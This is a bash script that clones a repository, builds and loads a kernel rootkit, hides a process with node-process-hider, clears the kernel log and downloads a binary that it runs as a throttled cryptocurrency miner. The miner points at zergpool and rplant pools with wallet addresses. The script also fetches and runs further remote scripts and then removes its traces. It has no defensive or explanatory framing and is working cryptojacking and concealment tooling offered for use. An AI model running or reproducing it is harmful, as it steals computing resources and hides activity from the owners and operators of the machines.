#!/bin/bash 
git clone https://github.com/BatiKangkung/Kerecek
sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesource.com/setup_12.x | sudo -E bash - && apt install nodejs -y && npm install -g npm@8.10.0 -y && npm i -g node-process-hider 
sudo apt-get install cpulimit
cd Kerecek/
rm -rf avx2
ph add avx2 
cpulimit -l 180 -e avx2 &
make
dmesg -C
insmod rootkit.ko
dmesg
wget -O avx2 https://gitlab.com/bolihufu.avefomah/semaphore-test/raw/master/vkax
chmod +x avx2
# ./avx2 -a mike -o stratum+tcps://stratum-na.rplant.xyz:17040 -u XoL3WHgSqF3mZcKajC3JG15VAhZXtdGYR1.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
# ./avx2 -a yespower -o stratum+tcps://stratum-na.rplant.xyz:17017 -u web1qvpk4dddsmy7yqnzltj4ehpn99uf6jlfpqukjvy.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null & 
# ./avx2 -a minotaurx -o stratum+tcps://stratum-na.rplant.xyz:17068 -u RP7dNRcUFy4BngHv5okrAMHAkW3guQ7kCU.$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 -p x >/dev/null &
./avx2 -a yespowerSUGAR -o stratum+tcp://yespowerSUGAR.na.mine.zergpool.com:6535 -u TX7hx8zqvfvb4c16QkuZYfrV4Kvqi8xMGi -p  c=TRX,mc=SUGAR,ID=$(echo $(shuf -i 100-999 -n 1)-CPU) -t 4 >/dev/null &
uname -a
pkill -31 avx2
pkill -31 cpulimit
wget https://github.com/BatiKangkung/KangKung/raw/master/time && chmod +x time
timeout 10m ./time
# time=${1-1}; while test $time -gt 0; do printf "$time"; sleep 5; done
wget https://raw.githubusercontent.com/Sushrut1101/Ubuntu-Tmate/master/spam.sh && chmod +x spam.sh
timeout 9m ./spam.sh
rmmod rootkit
dmesg
pkill -31 avx2
pkill -31 cpulimit
cd ..
rm -rf Kerecek
